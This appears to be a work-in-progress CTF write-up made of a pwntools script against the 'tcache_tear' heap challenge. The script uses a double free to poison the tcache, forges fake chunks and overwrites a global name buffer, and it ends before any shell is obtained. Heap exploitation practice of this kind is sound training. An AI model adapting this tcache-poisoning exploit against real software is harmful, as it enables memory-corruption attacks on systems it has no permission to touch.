Writeup: WIP
```python
#!/usr/bin/env python3
from pwn import *

binary_name = "exe"

exe = ELF("./tcache_tear_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")
context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

ru = lambda *x, **y: p.recvuntil(*x, **y)
rl = lambda *x, **y: p.recvline(*x, **y)
rc = lambda *x, **y: p.recv(*x, **y)
sla = lambda *x, **y: p.sendlineafter(*x, **y)
sa = lambda *x, **y: p.sendafter(*x, **y)
sl = lambda *x, **y: p.sendline(*x, **y)
sn = lambda *x, **y: p.send(*x, **y)

if args.REMOTE:
    p = connect("addr", 1337)
elif args.GDB:
    # p = process(f"debug_dir/exe")
    p = process([exe.path]) # For swapping to pwninit.
    # If there's stupid timers:
    # handle SIGALRM ignore
    gdb.attach(  # Cuz I have 0 clue how to get gdb.debug working
        p,
        """
        b *0x400b14
        b *0x400ba9
        b *0x400b99
        handle SIGALRM ignore
        cwatch execute "x/6xg 0x602060"
        cwatch execute "tcachebins"
        cwatch execute "x/4xg 0x602088"
        c
        """,
        aslr=False,
    )
else:
    # p = process(f"debug_dir/exe")
    p = process([exe.path]) # For swapping to pwninit.

# Tick 197 Certified ;)
def alloc(size, data):
    sleep(1)
    sla(b"Your choice :", b"1")
    sla(b"Size:", size)
    sla(b"Data:", data)

def free():
    sla(b"Your choice :", b"2")
    sleep(0.1)

fc2 = b''
fc2 += p64(0) # prev size
fc2 += p64(0x21) # size
fc2 += p64(0) # fd
fc2 += p64(0) # bk
fc2 += p64(0) #+ p64(0) # padding
fc2 += p64(0x21) # next previous size

sla(b"Name:", p64(0x602060))

#--------------------------fake chunk 2-----------------------------#
alloc(b'100', b'AAAA')
free()
free()
alloc(b'100', p64(0x602550))
alloc(b'100', b'trash')
alloc(b'100', fc2)
#--------------------------fake chunk 2-----------------------------#

fc = b''
fc += p64(0) # size of previous chunk
fc += p64(0x501) # size of chunk
fc += p64(0) # fd
fc += p64(0) # bk
fc += p64(0) * 3 # padding
fc += p64(0x602060) # keeping the addr of chunk we want to free

alloc(b'10', b'AAAA') # A
free()
free()
print('free x2')
#sla(b'Your choice :', b'3')
# tcache: tc -> A -> A -> A

alloc(b'10', p64(0x602050)) # overwrite forward ptr
print('overwrite forward ptr')
alloc(b'10', b'trash')
print('alloc trash')
alloc(b'10', fc)
print('overwrite name buffer')


free()

#sla(b'Your choice :', b'3')

p.interactive()
```
